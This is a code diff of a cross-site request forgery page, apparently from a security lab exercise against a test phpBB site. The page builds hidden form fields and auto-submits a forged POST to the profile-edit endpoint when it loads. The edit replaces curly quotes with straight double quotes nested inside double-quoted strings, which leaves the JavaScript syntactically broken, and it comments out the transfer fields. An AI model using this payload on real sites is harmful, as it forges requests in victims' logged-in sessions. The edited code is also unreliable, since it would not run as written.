@@ -5,12 +5,12 @@ This page sends a HTTP POST request onload.
 function post(url,fields)
 {
    //create a <form> element.
-   var p = document.createElement(’form’);
+   var p = document.createElement("form");
    //construct the form
    p.action = url;
    p.innerHTML = fields;
-   p.target = ’_self’;
-   p.method = ’post’;
+   p.target = "_self";
+   p.method = "post";
    //append the form to this web.
    document.body.appendChild(p);
    //submit the form
@@ -20,13 +20,13 @@ function csrf_hack()
 {
 var fields;
    // You should replace the following 3 lines with your form parameters
-   fields += "<input type=’hidden’ name=’username’ value=’Alice’>";
-   fields += "<input type=’hidden’ name=’transfer’ value=’10000’>";
-   fields += "<input type=’hidden’ name=’to’ value=’Bot’>";
-   // Note: don’t add an element named ’submit’ here;
+   fields += "<input type="hidden" name="username" value="Alice">";
+  //  fields += "<input type="hidden" name="transfer" value="10000">";
+  //  fields += "<input type="hidden" name="to" value="Bot">";
+   // Note: don"t add an element named "submit" here;
    //       otherwise, p.submit() will not be invoked.
-   //       ’Submit’ will work.
-   post(’http://www.csrflabphpbb.com/profile.php?mode=editprofile’,fields);
+   //       "Submit" will work.
+   post("http://www.csrflabphpbb.com/profile.php?mode=editprofile",fields);
 }
 window.onload = function(){csrf_hack();}
 </script>
